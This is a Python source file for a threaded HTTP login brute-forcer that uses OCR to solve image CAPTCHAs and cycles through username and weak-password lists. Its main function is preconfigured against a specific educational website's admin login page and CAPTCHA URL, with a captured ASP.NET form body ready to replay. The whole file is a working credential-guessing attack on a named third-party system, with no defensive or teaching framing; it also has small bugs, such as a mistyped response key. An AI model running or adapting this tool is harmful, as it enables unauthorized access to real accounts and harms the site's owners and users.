#!/usr/bin/env python
#-*- coding: utf-8 -*-
#import system lib
import copy
import Queue
import time
import sys
import threading
import urlparse
#import extension lib
import requests
#import selft extension
from lib import parse_verifycode
from lib import console_print 

class httpBrute:
    '''
    brute http login with verifycode
    verifycode is got by pytesseract in parse_verifycode.py
    the http request is handled by requests
    '''
    def __init__(self,user_file,pass_file,login_url,login_post_url,verifycode_url,post_data,payload_data,response_data):
        self.__APP_STOP = False
        self.__queue_payload = Queue.Queue()
        self.__lock_output_msg = threading.Lock()
        self.__lock_thread_num = threading.Lock()
        self.__thread_num = 0
        self.__login_url = login_url
        self.__login_post_url = login_post_url
        self.__verifycode_url = verifycode_url
        self.__user_file = user_file
        self.__pass_file = pass_file
        self.__post_data = post_data
        self.__payload_data = payload_data
        self.__response_data = response_data
        #define the work thread number and http error retry number
        self.__thread_count = 10
        self.__max_retry_count = 5

    def __get_user_password_dic(self,user_file, password_file):
        '''
        get username and password dic from file
        '''
        user_dic = []
        password_dic = []
        #
        try:
            with open(user_file) as f:
                for lines in f:
                    user_dic.append(lines.strip())
        except:
            user_dic = None
        #
        try:
            with open(password_file) as f:
                for lines in f:
                    password_dic.append(lines.strip())
        except:
            password_dic = None
        #
        return (user_dic, password_dic)


    def __generate_payload_queue(self,user_dic, password_dic):
        '''
        generate payload queue for request 
        '''
        payload_user_count = len(user_dic)
        payload_password_count = len(password_dic)
        payload_user_num = 0
        payload_password_num = 0
        payload_total = payload_user_count * payload_password_count
        progress_deltal = 5
        progress_num = 0
        progress_last = 0

        if payload_total == 0 :
            return
        while True:
            if self.__APP_STOP:
                break
            if payload_password_num >= payload_password_count:
                payload_user_num += 1
                payload_password_num = 0
            if payload_user_num >= payload_user_count:
                break
            if self.__queue_payload.qsize() < self.__thread_count * 2:
                self.__queue_payload.put(
                    (user_dic[payload_user_num], password_dic[payload_password_num]))
                payload_password_num += 1

                progress_num += 1
                progress_now = 100 * progress_num / payload_total 
                if progress_now - progress_last >= 5:
                    progress_last = progress_now
                    self.__print_result('[-]progress: %d%%...' % progress_last)
            else:
                time.sleep(0.01)


    def __get_one_payload(self):
        '''
        get one payload from queue
        '''
        if self.__queue_payload.empty():
            return (None, None)
        return self.__queue_payload.get()


    def __do_request(self): 
        '''
        do http request
        '''
        self.__lock_thread_num.acquire()
        self.__thread_num += 1
        self.__lock_thread_num.release()
        retry_num = 0
        retry_now = False
        username = password = None
        headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'}
        while True:
            if self.__APP_STOP:
                break
            if retry_now == False:
                retry_num = 0
                (username, password) = self.__get_one_payload()
            if username == None or password == None:
                break
            s = requests.Session()
            try:
                #login url
                no_need_login = False
                if self.__login_url != None and self.__login_url != '' :
                    r = s.get(self.__login_url,headers=headers)
                else:
                    no_need_login = True
                if no_need_login == True or r.status_code == requests.codes.ok:
                    #verifycode url
                    no_need_verifycode = False
                    if self.__verifycode_url != None and self.__verifycode_url != '':
                        verify_code = parse_verifycode.get_verifycode_from_http(self.__verifycode_url, s)
                    else:
                        verify_code = ''
                        no_need_verifycode = True
                    if  no_need_verifycode == True or self.__check_verifycode(verify_code):
                        payload_data = self.__format_post_payload_data(username, password, verify_code)
                        #login_post url
                        r = s.post(self.__login_post_url, data=payload_data,headers=headers)
                        if r.status_code == requests.codes.ok:
                            result = self.__check_response_success(r.content)
                            if result:
                                msg = "[+]success:payload(%s,%s)" % (username, password)
                                self.__print_result(msg)
                            else:
                                msg = "fail:payload(%s,%s)" % (username, password)
                                self.__print_progress(msg)
                            retry_now = False
                        else:
                            msg = "exception:payload(%s,%s),post data fail!" % (username, password)
                            self.__print_progress(msg)
                            retry_now,retry_num = self.__check_retry(retry_num)
                    else:
                        msg = "exception:payload(%s,%s),get verify code fail!" % (username, password)
                        self.__print_progress(msg)
                        retry_now,retry_num = self.__check_retry(retry_num)
                else:
                    msg = "exception:payload(%s,%s),get login page fail!" % (username, password)
                    self.__print_progress(msg)
                    retry_now,retry_num = self.__check_retry(retry_num)
            except requests.exceptions.ConnectionError:
                msg = "exception:playload(%s,%s) connection error!" % (username, password)
                self.__print_progress(msg)
                retry_now,retry_num = self.__check_retry(retry_num)
            except requests.exceptions.HTTPError:
                msg = "exception:playload(%s,%s) http error!" % (username, password)
                self.__print_progress(msg)
                retry_now,retry_num = self.__check_retry(retry_num)
            except requests.exceptions.Timeout:
                msg = "exception:playload(%s,%s) timeout!" % (username, password)
                self.__print_progress(msg)
                retry_now,retry_num = self.__check_retry(retry_num)
            except:
                msg = "exception:playload(%s,%s) error!" % (username, password)
                self.__print_progress(msg)
                retry_now,retry_num = self.__check_retry(retry_num)
        self.__lock_thread_num.acquire()
        self.__thread_num -= 1
        self.__lock_thread_num.release()

    def __check_retry(self,retry_num):
        '''
        check retry count
        '''
        if retry_num < self.__max_retry_count:
            retry_num += 1
            retry_now = True
        else:
            retry_now = False

        return (retry_now,retry_num)

    def __format_post_payload_data(self,username, password, verifycode):
        '''
        set the payload to post data
        '''
        post_data_payload = copy.deepcopy(self.__post_data)
        post_data_payload[self.__payload_data['username']] = username
        post_data_payload[self.__payload_data['password']] = password
        post_data_payload[self.__payload_data['verifycode']] = verifycode

        return post_data_payload

    def __check_verifycode(self,code):
        '''
        check the verifycode wheater is right
        '''
        if code == None:
            return False
        #check the length
        if len(code)!=4 :
            return False
        #check the char
        import re
        regex=r'[^\w]'
        p=re.compile(regex)
        m=p.findall(code)
        if m and len(m)>0:
            return False

        return True

    def __check_response_success(self,response_text):
        '''
        check response is success
        '''
        success_text = self.__response_data.get('success',None)
        fail_text = self.__response_data.get('fail',None)

        if success_text != None and response_text.find(success_text) >= 0:
            return True
        if fail_text != None and response_text.find(fail_text) >= 0:
            return False

        return False

    def __print_progress(self,msg):
        self.__lock_output_msg.acquire()
        console_print.print_progress(msg)
        self.__lock_output_msg.release()

    def __print_result(self,msg):
        self.__lock_output_msg.acquire()
        console_print.print_result(msg)
        self.__lock_output_msg.release()

    def run(self):
        user_dic, password_dic = self.__get_user_password_dic(self.__user_file, self.__pass_file)
        if user_dic == None:
            self.__print_result("read username dic file %s fail!" % self.__user_file)
            return
        if password_dic == None:
            self.__print_result("read password dic file %s fail!" % self._pass_file)
            return
        self.__print_result("start (press ctrl+c stop)...")
        #start payload queue thread:
        t_queue_payload=threading.Thread(target=self.__generate_payload_queue,args=(user_dic, password_dic))
        t_queue_payload.setDaemon(True)
        t_queue_payload.start()
        time.sleep(1)
        #start request thread:
        for i in range(self.__thread_count):
            t_request=threading.Thread(target=self.__do_request,args=())
            t_request.setDaemon(True)
            t_request.start()
        while self.__thread_num > 0:
            try:
                time.sleep(0.01)
            except KeyboardInterrupt:
                self.__APP_STOP = True
                self.__print_result('[-]waiting for thread exit...')

        self.__print_result("[-]finish!")

def parse_string_data(text):
    '''
    set the payload data from post urlencoded string
    '''
    parse_data=urlparse.parse_qsl(text,keep_blank_values=True)

    return dict(parse_data)

def main():
    #the http brute url and payload dictionary params
    user_file = "user.txt"
    pass_file = "weak_1500.txt"
    login_url = ''
    login_post_url = 'http://www.sepc.edu.cn/Admin/Login.aspx'
    verifycode_url = 'http://www.sepc.edu.cn/Admin/VerifyCode.aspx?VerifyCodeName=WebFort_Admin_Login'
    #
    data = '''__VIEWSTATE=%2FwEPDwUKLTIzMjEyNDA5MA8WAh4JUmV0dXJuVXJsBSlodHRwOi8vd3d3LnNlcGMuZWR1LmNuL2FkbWluL0RlZmF1bHQuYXNweBYCAgMPZBYCAgEPDxYCHghJbWFnZVVybAUYSW1hZ2UvbG9naW4vbG9naW5fMDEuZ2lmZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFDEJ1dHRvbkluc2VydLbfmMfzGu9usZuBp0fTR05dcSrd&ButtonInsert.y=0&ButtonInsert.x=0&TextBoxUserName=admin&TextBoxPassword=test&__EVENTVALIDATION=%2FwEWBQKG8461AgLt8L%2BvAQKpzpH0DQKn%2BK%2FeAgLdv4u1Ah0UorjdbGuagDJx2ffMd9zTms6W&TextBoxVerifyCode=YWKc'''
    #the full data to server
    post_data = parse_string_data(data)
    #the payload data to server,must have username,password,verifycode name
    payload_data={'username':'TextBoxUserName','password':'TextBoxPassword','verifycode':'TextBoxVerifyCode'}
    #check the response,must have success or fail flag 
    response_data={'success':None,'fail:':'VerifyCode.aspx?VerifyCodeName=WebFort_Admin_Login'}
    #run the brute
    app = httpBrute(user_file,pass_file,
        login_url,login_post_url,verifycode_url,
        post_data,payload_data,response_data)
    app.run()

if __name__ == '__main__':
    main()
